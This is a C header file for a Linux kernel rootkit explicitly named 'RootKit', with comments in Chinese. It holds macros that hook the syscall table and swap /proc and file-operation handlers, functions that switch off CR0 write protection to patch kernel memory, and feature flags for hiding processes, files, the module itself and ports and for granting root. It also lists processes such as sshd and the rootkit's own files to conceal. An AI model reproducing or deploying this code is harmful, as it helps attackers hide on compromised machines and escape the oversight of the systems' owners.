# ifndef _GU_ZHENGXIONG_STRUCTS_H
# define _GU_ZHENGXIONG_STRUCTS_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>

struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};

#define PF_INVISIBLE 0x10000000

#define MODULE_NAME "RootKit"
#define fn_printk(level, fmt, ...) 				\
	printk(level "%s: " fmt, __func__, ##__VA_ARGS__)

#define fm_printk(level, fmt, ...) 				\
	printk(level "%s.%s: " fmt, THIS_MODULE->name, __func__, ##__VA_ARGS__)

#define fn_alert(fmt, ...) 						\
	fn_printk(KERN_ALERT, fmt, ##__VA_ARGS__)

#define fm_alert(fmt, ...) 						\
	fm_printk(KERN_ALERT, fmt, ##__VA_ARGS__)

// do...while的循环体只会执行一次
// 是为了让HOOK_SCT是一条语句
#define HOOK_SCT(sct, name)  					\
	do { 										\
		real_##name = (void *)sct[__NR_##name]; \
		sct[__NR_##name] = (void *)fake_##name; \
	}while(0)


#define UNHOOK_SCT(sct, name) 					\
	sct[__NR_##name] = (void *)real_##name

#define set_afinfo_seq_op(op, path, afinfo_struct, new, old) \
	do { 													\
		struct file *filp; 									\
		afinfo_struct *afinfo; 								\
		filp = filp_open(path, O_RDONLY, 0); 				\
		if (IS_ERR(filp)) { 								\
			fm_alert("Failed to open %s with error %ld\n", 	\
							path, PTR_ERR(filp)); 			\
			old = NULL; 									\
		} else { 											\
			afinfo = PDE_DATA(filp->f_path.dentry->d_inode);\
			old = afinfo->seq_ops.op; 						\
			fm_alert("Setting seq_op->" #op "from %p to %p\n",\
							old, new); 						\
			afinfo->seq_ops.op = new; 						\
			filp_close(filp, 0); 							\
		} 													\
	} while(0) 


//-----------------------------cwg--------------------------------
// 关闭写保护
void disable_wp(void) {
    unsigned long cr0;
    preempt_disable();
    cr0 = read_cr0();
    clear_bit(X86_CR0_WP_BIT, &cr0);
    write_cr0(cr0);
    preempt_enable();
}

// 打开写保护
void enable_wp(void) {
    unsigned long cr0;
    preempt_disable();
    cr0 = read_cr0();
    set_bit(X86_CR0_WP_BIT, &cr0);
    write_cr0(cr0);
    preempt_enable();
}
#define set_file_op(path, new_iterate, old_iterate) \
    {\
        struct file *filp;\
        struct file_operations *f_op;\
        filp = filp_open(path, O_RDONLY, 0);\
        if (IS_ERR(filp)) {\
            fm_alert("Failed to open %s with error %ld.\n", path, PTR_ERR(filp));\
            old_iterate = NULL;\
        } else {\
            f_op = (struct file_operations *)filp->f_op;\
            old_iterate = f_op->iterate;\
            fm_alert("Changing file_op->iterate from %p to %p.\n", old_iterate, new_iterate);\
            disable_wp();\
            f_op->iterate = new_iterate;\
            enable_wp();\
        }\
    }
//------------------------------------------------------------

enum {
	HIDEPROC = 0,
	ROOT = 1,
	HIDEMOD = 2,
	HIDEPORT = 3,
};

// List of processes to hide from ps
const char * const HIDDEN_PROCESSES[] = {"bash", "ps", "sshd"};

// List of files to hide from getdents and open
const char * const HIDDEN_FILES[] = {"RootKit.h", "RootKit.c", "RootKit.ko","Makefile","RootKit"};
# endif // RootKit.h
